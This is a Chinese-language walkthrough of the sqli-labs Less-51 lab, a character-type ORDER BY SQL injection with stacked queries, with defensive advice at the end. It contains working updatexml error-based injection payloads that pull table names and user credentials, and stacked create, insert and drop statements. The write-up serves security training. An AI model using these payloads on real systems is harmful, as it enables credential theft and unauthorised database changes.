## 题目: Sqli‑labs Less‑51

## 题目描述
GET传入sort排序参数，sort被单引号包裹，字符型ORDER BY注入；启用`mysqli_multi_query()`支持堆叠注入，开启SQL报错回显。ORDER BY位置UNION无法输出数据，读取数据使用updatexml报错注入，写数据依靠分号堆叠执行。

## 核心原理
```php
$sql = "SELECT * FROM users ORDER BY '$id'";
if (mysqli_multi_query($con1, $sql))
```
关键点：字符型，payload 需要`'`闭合，`-- -`注释尾部；`mysqli_multi_query()`支持`;`多条 SQL；页面开启报错回显，updatexml 报错注入可用；ORDER BY 位置 UNION 无效；堆叠写操作页面无直接回显，需要报错注入验证结果；updatexml 存在 31 字符截断，hex 编码处理长数据与特殊单引号字符。

**解题思路**
1. Burp 抓包修改 sort 参数，单引号确认闭合；
2. updatexml 报错注入依次爆库、表、字段，hex 编码解决截断；
3. 使用`';`堆叠执行 create、insert 创建写入测试表；
4. 通过报错注入验证写入结果，测试完成 drop 清理临时表。

## 解题步骤
### 1. 测试单引号闭合 Burp 包
```
GET /sqli-labs/Less-51/?sort=1' HTTP/1.1
Host: 127.0.0.1
```
页面抛出 SQL 语法错误，确认单引号注入点。

### 2. 报错注入爆库名 Burp 包
```
GET /sqli-labs/Less-51/?sort=1' and updatexml(1,concat(0x7e,database()),1) -- - HTTP/1.1
Host: 127.0.0.1
```
页面报错：`XPATH syntax error: '~security'`

### 3. 爆表名 Burp 包
```
GET /sqli-labs/Less-51/?sort=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- - HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~emails,referers,uagents,users`

### 4. 爆字段名 Burp 包
```
GET /sqli-labs/Less-51/?sort=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)),1) -- - HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~id,username,password`

### 5. hex 编码读取 users 数据 Burp 包
```
GET /sqli-labs/Less-51/?sort=1' and updatexml(1,concat(0x7e,substr(hex((select group_concat(username,0x3a,password) from users)),1,30)),1) -- - HTTP/1.1
Host: 127.0.0.1
```
> 
> 修改 substr 偏移参数分段获取全部 hex 字符串，解码得到明文账号密码。

### 6. 堆叠创建 zz_t51 测试表 Burp 包
```
GET /sqli-labs/Less-51/?sort=1'; create table zz_t51(a int) -- - HTTP/1.1
Host: 127.0.0.1
```

### 7. 堆叠插入数据 Burp 包
```
GET /sqli-labs/Less-51/?sort=1'; insert into zz_t51 values(51) -- - HTTP/1.1
Host: 127.0.0.1
```

### 8. 报错注入验证写入数据 Burp 包
```
GET /sqli-labs/Less-51/?sort=1' and updatexml(1,concat(0x7e,(select * from zz_t51)),1) -- - HTTP/1.1
Host: 127.0.0.1
```

### 9. 清理测试表 Burp 包
```
GET /sqli-labs/Less-51/?sort=1'; drop table zz_t51 -- - HTTP/1.1
Host: 127.0.0.1
```

## 踩坑记录
1. 和 Less‑50 区分，50 数字型无需引号；51 字符型，payload 必须`'`闭合加`-- -`注释。
2. ORDER BY 位置 UNION 查询无法输出数据，读取数据使用报错注入。
3. updatexml 存在 31 字符截断，库内存在带单引号用户名，使用 hex 编码规避问题。
4. 堆叠 create/insert 页面不会展示执行结果，必须二次查询验证是否写入成功。
5. 测试结束 drop 删除临时表，避免污染靶场数据库。

## 知识点总结
- 字符型 ORDER BY 堆叠注入：`ORDER BY '$id'`，依靠`mysqli_multi_query`实现多条 SQL 执行。
- 利用组合：updatexml 报错注入做读取，分号堆叠做写操作，再用报错注入校验写结果。
- hex 编码绕过报错长度截断与特殊字符干扰。
- 关卡对比：Less‑50 数字型，Less‑51 字符型，差异仅为闭合符号。
- 防御：sort 参数配置列名白名单；预编译参数绑定；关闭 mysqli_multi_query 多语句；生产环境关闭 SQL 报错回显。
